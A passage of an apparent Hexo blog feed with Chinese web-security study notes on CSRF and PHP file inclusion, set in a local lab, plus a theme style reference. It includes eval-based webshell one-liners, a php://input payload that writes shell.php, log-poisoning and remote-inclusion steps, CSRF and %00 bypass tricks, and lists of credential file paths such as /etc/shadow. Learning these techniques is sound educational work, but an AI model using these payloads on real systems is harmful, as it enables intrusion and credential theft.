脚本的开始和结束标记，PHP 代码写在这对标记之间。</li></ul></li><li><p><strong><code>@eval()</code></strong></p><ul><li><code>eval()</code> 是一个危险的 PHP 函数，它会将传入的字符串作为 PHP 代码执行。</li><li><code>@</code> 是 PHP 中的错误抑制操作符，它会隐藏 <code>eval()</code> 运行时可能出现的错误或警告。</li></ul></li><li><p><strong><code>$_POST[&#39;cmd&#39;]</code></strong></p><ul><li><code>$_POST</code> 是一个全局变量，用来获取通过 HTTP POST 请求传递的数据。</li><li><code>$_POST[&#39;cmd&#39;]</code> 是从 POST 请求中读取键名为 <code>cmd</code> 的值（内容由外部提供）。</li><li>代码将这个内容直接传递给 <code>eval()</code> 函数。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> Liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础学习</title>
      <link href="/2024/10/05/CSRF/"/>
      <url>/2024/10/05/CSRF/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于CSRF的基础学习</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>全称Cross-site request forgery，翻译过来就是跨站请求伪造，属于纯逻辑漏洞</p><p>指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作(如转账、改密等）</p><p><strong>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用</strong></p><p><img src="/../img/image.png"></p><p><img src="https://i.imgur.com/zCtSKxv.png"></p><h1 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h1><p>环境：pikachu靶场</p><p><img src="https://i.imgur.com/gAMY0Kj.png"></p><p>构造恶意链接:<br><code>http://192.168.0.215/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=aaa&amp;phonenum=aaa&amp;add=aaa&amp;email=aaaa&amp;submit=submit</code></p><p>点击后用户信息被修改成aaa</p><p><img src="https://i.imgur.com/CKb0yv1.png"></p><p>大致总结一下XSS与CSRF的流程区别如下</p><table><thead><tr><th>XSS</th><th>CSRF</th></tr></thead><tbody><tr><td>跨站脚本攻击</td><td>客户端请求伪造</td></tr><tr><td>C用户-&gt;登录-&gt;A站(存在xss漏洞)</td><td>C用户-&gt;登录A站(存在CSRF漏洞)</td></tr><tr><td>C用户点击了B用户发的恶意链接</td><td>C用户点击了B用户发的恶意链接</td></tr><tr><td>C用户的cookie泄露给了B</td><td></td></tr><tr><td>B用户可以利用cookie直接操作C用户在A网站的账户</td><td>B用户以C用户的身份向A站发送功能请求</td></tr></tbody></table><h1 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h1><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p><img src="https://i.imgur.com/8Pj4ADu.png"></p><h2 id="同源策略（SOP）"><a href="#同源策略（SOP）" class="headerlink" title="同源策略（SOP）"></a>同源策略（SOP）</h2><p>同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</p><p>基本功能：<strong>不允许来自不同来源的 2 个网页相互干扰。</strong></p><p>以<code>http://www.aa.com:8080/index/vue.js</code>为例</p><table><thead><tr><th>http:&#x2F;&#x2F;</th><th>www.</th><th>aaa.com</th><th>:8080</th><th>&#x2F;index&#x2F;vue.js</th></tr></thead><tbody><tr><td>协议</td><td>子域名</td><td>主域</td><td>端口</td><td>路径</td></tr></tbody></table><p>其中，同源主要指得是协议+域名+端口号前三者相同，前三者任一个不一样则会产生跨域。</p><p><img src="https://i.imgur.com/0HeaNxc.png"></p><h2 id="安全令牌"><a href="#安全令牌" class="headerlink" title="安全令牌"></a>安全令牌</h2><p><img src="https://i.imgur.com/xiSnCcC.png"></p><h1 id="攻击演示-1"><a href="#攻击演示-1" class="headerlink" title="攻击演示"></a>攻击演示</h1><p>前置：一个存在CSRF漏洞的网站，两个任意用户</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>这里使用用户A进行修改信息的操作包并使用burp抓取到包,然后生成POC包</p><p><img src="https://i.imgur.com/CKmbzkd.gif"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>验证使用POC，注意此时使用另一个用户进行验证</p><p>两种方式</p><ul><li><p>1.使用Burp的直接生成链接<br><img src="https://i.imgur.com/gzLsRoZ.gif"></p></li><li><p>2.构造.html文件<br>新建一个文件直接粘贴生成的poc内容，然后将文件后缀修改成html。<br><img src="https://i.imgur.com/Wh909dP.gif"><br>然后拖拽到浏览器打开<br><img src="https://i.imgur.com/T36mbWp.png"></p></li></ul><p>会有一个提交请求的按钮，在原生成poc的网页登录没有下线的情况下，点击这个提交按钮回返回1，但这里原登录下线了，所以请求失败</p><p><img src="https://i.imgur.com/LUwe3oA.gif"></p><p>后续重新登录再刷新则请求成功</p><p><img src="https://i.imgur.com/1pVqd0P.gif"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>查看结果，修改后两个用户的信息一致，证明CSRF攻击成功</p><p><img src="https://i.imgur.com/zfr8vOO.png"></p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>GET  <a href="http://bank.com/?m=1000&uid=1445">http://bank.com?m=1000&amp;uid=1445</a><br>链接类型的 csrf <a href="http://bank.com/?m=1000&uid=1445">http://bank.com?m=1000&amp;uid=1445</a></p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>参照：</p><ul><li><a href="https://xz.aliyun.com/t/6176?time__1311=n4+xnD0DgDcDR77GOYD/ia4BK5D54hqG=3CQQO4D">绕过CSRF防御 - 先知社区 (aliyun.com)</a></li><li><a href="https://threezh1.com/2020/02/25/CSRF%E7%BB%95%E8%BF%87%E6%95%B4%E7%90%86/">Threezh1’Blog</a></li></ul><p>常见的绕过方法：</p><ol><li>未考虑不存在的情况下，达到绕过效果，删除或置空参数：refere,cdrf_token</li><li>如果这个scrf_token他是用post方式进行传参，通过修改传参方式达到绕过</li><li>和会话进行绑定，一次性token,公共池拿到的token</li></ol><p>简单试着列个表看下</p><table><thead><tr><th>应用场景</th><th>绕过方式</th></tr></thead><tbody><tr><td>通用类型</td><td>点击劫持</td></tr><tr><td>请求方式可修改</td><td>GET-&gt;POST或者POST-&gt;GET</td></tr><tr><td>CSRF token效验</td><td>删除token参数或发送空token</td></tr><tr><td>CSRF token检查是否合法</td><td>使用另一个session的CSRF token</td></tr><tr><td>Referer字段的CSRF防御</td><td>移除referer字段或者置空</td></tr><tr><td>基于白名单的referer检查</td><td>尝试绕过验证URL的正则表达式。</td></tr><tr><td>域名校验</td><td>后面加域名&#x2F;拼接域名&#x2F;前后加字符</td></tr></tbody></table><h1 id="话题提及"><a href="#话题提及" class="headerlink" title="话题提及"></a>话题提及</h1><ol><li>csrf+xss(存储型)的联动</li><li><a href="https://blog.csdn.net/zkaqlaoniao/article/details/134399773">漏洞-任意账号注册_任意用户注册漏洞危害-CSDN博客</a></li><li>换行回车注入  jsonp劫持    包中有callback参数</li><li>XSS钓鱼网站</li><li><a href="https://51tbox.com/web/blog/detail/1297.html">CSRF攻击修改用户微信绑定（SRC思路）-工具盒子 (51tbox.com)</a>再绑定qq或者微信时，抓到我们 绑定的包，吧那些包六七但留下链接、</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/04/%E6%9C%AA%E5%91%BD%E5%90%8D/"/>
      <url>/2024/10/04/%E6%9C%AA%E5%91%BD%E5%90%8D/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>{{title}}</title>
      <link href="/2024/10/04/55/"/>
      <url>/2024/10/04/55/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含基础学习</title>
      <link href="/2024/10/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/10/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于基本十大漏洞之一文件包含的一些学习笔记</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h1><p>简单定义：用户输入的数据未经过严格校验并过滤，就拼接到<strong>文件包含函数</strong>中并执行。</p><p>详细定义：File inclusion(文件包含漏洞)是一种依赖于脚本运行而影响应用程序的漏洞，因为许多脚本语言支持使用文件包含（将另一个文件代码加入当前文件中），这种功能允许开发者把可使用的代码插入单个文件中，然后包含文件当中的代码会被当前脚本解释执行，由于开发者使用了可变的文件包含路径，且没有对变量参数做过滤和处理，导致攻击者可以控制变量，构造恶意文件路径，导致文件包含漏洞。</p><blockquote><p>[!NOTE] php常见的文件包含函数<br><code>require()</code>：只要程序一运行就包含文件，找不到被包含的文件时会产生报错并终止脚本的运行<br><code>include()</code>：当程序执行到include()函数时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br><code>include_once()</code>：与include()类似，但文件中代码已被包含则不会再次包含<br><code>require_once()</code>：与require()类似，但文件中代码已被包含则不会再次包含</p></blockquote><h1 id="主要分类"><a href="#主要分类" class="headerlink" title="主要分类"></a>主要分类</h1><p>主要分为本地文件包含和远程文件包含，区别主要也就是被包含文件的位置，即本地和远程</p><h3 id="本地文件包含：包含当前服务器本地文件的漏洞"><a href="#本地文件包含：包含当前服务器本地文件的漏洞" class="headerlink" title="本地文件包含：包含当前服务器本地文件的漏洞"></a>本地文件包含：包含当前服务器本地文件的漏洞</h3><p>代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>$_GET[&#39;filename&#39;]</code> 获取用户通过 URL 传递的 <code>filename</code> 参数值，将其赋值给 <code>$file</code> 变量。例如，假设 URL 是 <code>example.com/script.php?filename=test.php</code>，那么 <code>$file</code> 就会等于 <code>test.php</code>。</li><li><code>include</code> 是 PHP 中用于包含并执行另一个 PHP 文件的语句。该语句会将 <code>$file</code> 变量的值对应的文件内容包含并执行。如果 <code>$file</code> 的值是 <code>test.php</code>，那么 <code>test.php</code> 文件的内容会被载入并执行。</li></ul><h4 id="示例：使用phpstudy搭建网页，以文件包含的代码创建一个1-php文件"><a href="#示例：使用phpstudy搭建网页，以文件包含的代码创建一个1-php文件" class="headerlink" title="示例：使用phpstudy搭建网页，以文件包含的代码创建一个1.php文件"></a>示例：使用phpstudy搭建网页，以文件包含的代码创建一个1.php文件</h4><ol><li><p>直接访问1.php文件，由于没有内容所以直接报错。<br><img src="https://i.imgur.com/1HejgDO.gif" alt="动画.gif"></p></li><li><p>传参一个指定的文件路径，读取了指定文件内容<br><img src="https://i.imgur.com/1d0qHDV.gif" alt="动画26.gif"></p></li><li><p>执行php代码</p></li></ol><p>创建一个一句话木马文件且类型为<code>.txt</code>,名为muma.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问muma.txt<br><img src="https://i.imgur.com/CZvhyWX.gif"><br>传入参数a&#x3D;phpinfo(),成功执行（注意此处文件包含传参不要用？,而是使用&amp;）<br><img src="https://i.imgur.com/AWQd6wx.gif" alt="动画26.gif"></p><p>结论：本地文件包含能使包含的任意文件都能执行</p><h3 id="远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过"><a href="#远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过" class="headerlink" title="远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过"></a>远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过</h3><blockquote><p>[!warning] 必要前置<br>配置文件php.ini中的allow_url_fopen,allow_url_include的值为ON<br>allow_url_include    是否允许引用URL文件<br>allow_url_fopen      是否允许打开URL文件<br>phpstudy配置文件的参考路径：phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php5.59.nts&#x2F;php.ini</p></blockquote><h4 id="示例：本地配置phpstudy的php-ini文件，远程主机创建木马文件"><a href="#示例：本地配置phpstudy的php-ini文件，远程主机创建木马文件" class="headerlink" title="示例：本地配置phpstudy的php.ini文件，远程主机创建木马文件"></a>示例：本地配置phpstudy的php.ini文件，远程主机创建木马文件</h4><ol><li>php.ini配置完毕，尝试远程文件包含</li></ol><p><img src="https://i.imgur.com/Yf6xlT8.gif" alt="动画26.gif"></p><ol start="2"><li>远程连接服务器创建木马文件muma.php</li></ol><p><img src="https://i.imgur.com/sfPG4Wc.gif" alt="动画26.gif"></p><ol start="3"><li>远程文件包含代码执行</li></ol><p><img src="https://i.imgur.com/X2dUrG3.gif" alt="动画26.gif"><br>结论：本地没有木马，自己在自己的服务器上写马，然后让目标包含你的服务器上的马，从而达成获取权限</p><h1 id="主要危害"><a href="#主要危害" class="headerlink" title="主要危害"></a>主要危害</h1><h2 id="获取相关配置信息"><a href="#获取相关配置信息" class="headerlink" title="获取相关配置信息"></a>获取相关配置信息</h2><p>通过查看敏感文件获取配置信息，也可以通过访问相关日志获取敏感信息</p><blockquote><p>[!NOTE] 敏感路径<br>windows系统：</p><p>　　c:\boot.ini  &#x2F;&#x2F;  查看系统版本</p><p>　　c:\windows\system32\inetsrc\MetaBase.xml   &#x2F;&#x2F;IIS配置文件</p><p>　　c:\windows\repair\sam   &#x2F;&#x2F;存储windows系统初次安装的密码</p><p>　　c:\programFiles\mysql\my.ini  &#x2F;&#x2F;MYSQL root密码</p><p>　　c:\windows\php.ini &#x2F;&#x2F; php 配置信息</p><p>Linux&#x2F;Unix系统</p><p>    &#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</p><p>    &#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</p><p>    &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</p><p>   &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</p><p>    &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</p><p>    &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</p><p>    &#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</p></blockquote><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>参见前文的两个示例</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><blockquote><p>[!NOTE] 命令执行示例<br>此处以本地文件包含为示例：</p><ul><li>修改前面的一句话木马代码为系统执行的代码<br><img src="https://i.imgur.com/BYvzI4C.gif" alt="动画26.gif"></li><li>执行系统命令<br><img src="https://i.imgur.com/zqxTO42.gif" alt="动画26.gif"></li></ul></blockquote><h3 id="可利用途径："><a href="#可利用途径：" class="headerlink" title="可利用途径："></a>可利用途径：</h3><p>　　·上传图片：图片包含getshell</p><p>　　·读文件：读取php文件</p><p>　　·包含日志文件getshell</p><p>　　·包含&#x2F;proc&#x2F;self&#x2F;environ&#x2F;文件getshell</p><p>　　·有phpinfo可包含临时文件</p><p>　　·包含data:&#x2F;&#x2F;或php:&#x2F;&#x2F;inout等伪协议（需要allow_url_include&#x3D;On）</p><h2 id="常见的使用方式"><a href="#常见的使用方式" class="headerlink" title="常见的使用方式"></a>常见的使用方式</h2><p>通过抓包修改UA从而实现日志写马<br>根据不同中间件来判断不同的日志储存位置，例如access.log或者error.log等，所以可以尝试写入一些奇怪的数据，例如<code>&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code>,访问出错后就会写入日志文件，在使用本地包含漏洞包含日志文件，从而得到webshell</p><p>注：一般在referer或者ua中写入，尽量使用抓包改包写入，不然很可能会被url编码，导致木马失效</p><p><img src="https://i.imgur.com/F2WZVN8.gif" alt="动画26.gif"></p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>大致详情参见：<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a><br>这里主要参照：<a href="https://www.php.net/manual/zh/wrappers.php.php">PHP: php:&#x2F;&#x2F; - Manual</a></p><p>php带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exists()、filesize()等文件系统函数所提供的功能类似；可以结合文件包含进行漏洞利用</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）</p><p>步骤：</p><p>1.修改url部分加入<code>?file=php://input</code>发送请求，然后抓包</p><p>2.加入参数<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#39;);?&gt;</code>,</p><p>用写入模式 (<code>&#39;w&#39;</code>)打开名为 <code>shell.php</code> 的文件(没有则创建)，并将<code>&#39;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#39;</code>写入。以此达成创建一句话木马文件的目的</p><p>最后结果是在当前目录下生成一个一句话木马文件shell.php</p><p><img src="https://i.imgur.com/Wj2ZVIQ.gif" alt="动画26.gif"></p><p>木马效果，可以正常传参并执行php</p><p><img src="https://i.imgur.com/BLAjvhe.gif" alt="动画26.gif"></p><p>php:&#x2F;&#x2F;input接受GET，POST，PUT三种传参，但主要还是使用读取</p><p><img src="https://i.imgur.com/pd5GV0Q.gif" alt="动画26.gif"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>条件:只是读取，需要开启allow_url_fopen，不需开启allow_url_include</p><p>php:&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器的名称，以管道符（<code>|</code>）分割。</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可设定一个或多个过滤器名称，以管道符(<code>|</code>)分隔</td></tr><tr><td>&lt;;两个链的筛选列表&gt;</td><td>任何没有以<code>read=</code>或<code>write=</code>为前缀的筛选器列表会视情况应用于读或写链、</td></tr></tbody></table><p>编码读取代码示例：</p><p><code>php://filter/read=covert.base64-encode/resource=</code></p><p><img src="https://i.imgur.com/hA9ZTUc.gif" alt="动画26.gif"></p><p>常用的使用，在无法明文读取的情况下，跳过效验以base64读取文件获取文件内容</p><p><img src="https://i.imgur.com/yvsqwLH.gif" alt="动画26.gif"></p><p>伪协议参考：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#要实现远程文件包含需要allow_url_fopen和allow_url_include都开启</span></span><br><span class="line"><span class="comment">#读文件(需要开启 allow_url_fopen)</span></span><br><span class="line">?filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xxx.php </span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#post传值（需开启 allow_url_include）</span></span><br><span class="line">?file=php:<span class="comment">//input </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码执行(php&gt;=5.2.0)</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 </span></span><br><span class="line">data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file读文件</span></span><br><span class="line">?abc=file:<span class="comment">///etc/passwd</span></span><br><span class="line"><span class="comment">#phar（&gt;=5.3.0）</span></span><br><span class="line">?file=phar:<span class="comment">//压缩包/内部文件 phar://xxx.png（压缩包）/shell.php （内部文件）</span></span><br><span class="line"><span class="comment">#zip（PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才</span></span><br><span class="line">可以 <span class="comment">#在浏览器中要编码为%23）</span></span><br><span class="line">?file=zip:<span class="comment">//[压缩文件绝对路径]%23[压缩文件内的子文件名] </span></span><br><span class="line">zip:<span class="comment">//xxx.png#shell.php     </span></span><br></pre></td></tr></table></figure><h4 id="常用的绕过"><a href="#常用的绕过" class="headerlink" title="常用的绕过"></a>常用的绕过</h4><p>绕过方法1：%00 截断</p><p>　　条件：magic_quotes_gpc &#x3D; Off PHP 版本&lt;5.3.4</p><p>　　测试：？filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00</p><p>绕过方法2：路径长度截断</p><p>　　条件：windows下目录路径最大长度为256字节，超出部分将丢弃；</p><p> 　　　　  Linux下目录最大长度为4096字节，超出长度将丢弃</p><p>　　测试：?filename&#x3D;text.txt.&#x2F;.&#x2F;.&#x2F;.&#x2F;.  或?filename&#x3D;test.txt…..</p><p><strong>限制远程包含绕过</strong></p><p>　测试代码：<?php include($_GET['filename'].".html");?>  多添加了html后缀，到最后远程包含的文件　一会多一个HTML后缀</p><p><strong>问号绕过</strong></p><p>　　测试：？filename&#x3D;<a href="http://192.168.91.133/FI/php.txt">http://192.168.91.133/FI/php.txt</a>?</p><hr><p>　　测试：?filenamr&#x3D;<a href="http://192.168.91.133/FI/php.txt%23">http://192.168.91.133/FI/php.txt%23</a></p><p><strong>空格绕过</strong></p><p>　　测试：?filename&#x3D;<a href="http://192.168.91.133/FI/php.txt%20">http://192.168.91.133/FI/php.txt%20</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>参考样式</title>
      <link href="/2024/10/02/Hexo%E4%B8%BB%E9%A2%98%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/"/>
      <url>/2024/10/02/Hexo%E4%B8%BB%E9%A2%98%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>因为看着头疼所以简单整理了一下Hexo主题的样式，不过似乎用处不是很大</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="引用样式"><a href="#引用样式" class="headerlink" title="引用样式"></a>引用样式</h1><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --&gt;</span><br><span class="line">&lt;!-- 其中 class=&quot;blockquote-center&quot; 是必须的 --&gt;</span><br><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;样式一&lt;/blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签 方式，要求版本在0.4.5或以上 --&gt;  </span><br><span class="line">&#123;% centerquote %&#125;样式二&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签别名 --&gt;</span><br><span class="line">&#123;% cq %&#125; 样式三&#123;% endcq %&#125;</span><br></pre></td></tr></table></figure><!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --><!-- 其中 class="blockquote-center" 是必须的 --><blockquote class="blockquote-center">样式一</blockquote><!-- 标签 方式，要求版本在0.4.5或以上 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式二</p>            <i class="fa fa-quote-right"></i>          </blockquote><!-- 标签别名 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式三</p>            <i class="fa fa-quote-right"></i>          </blockquote><h2 id="提示框样式"><a href="#提示框样式" class="headerlink" title="提示框样式"></a>提示框样式</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note class_name">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note default %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note default">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note primary %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note primary">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note success %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note success">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note info %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note info">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note warning %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note warning">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note danger %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><div class="note danger">            <p>Content (md partial supported) </p>          </div><h2 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h2><p>非常适合在您的帖子中添加引文，其中包含可选的作者、来源和标题信息。</p><p><strong>Alias:</strong> quote </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p><strong>没有参数，普通的块引用</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span 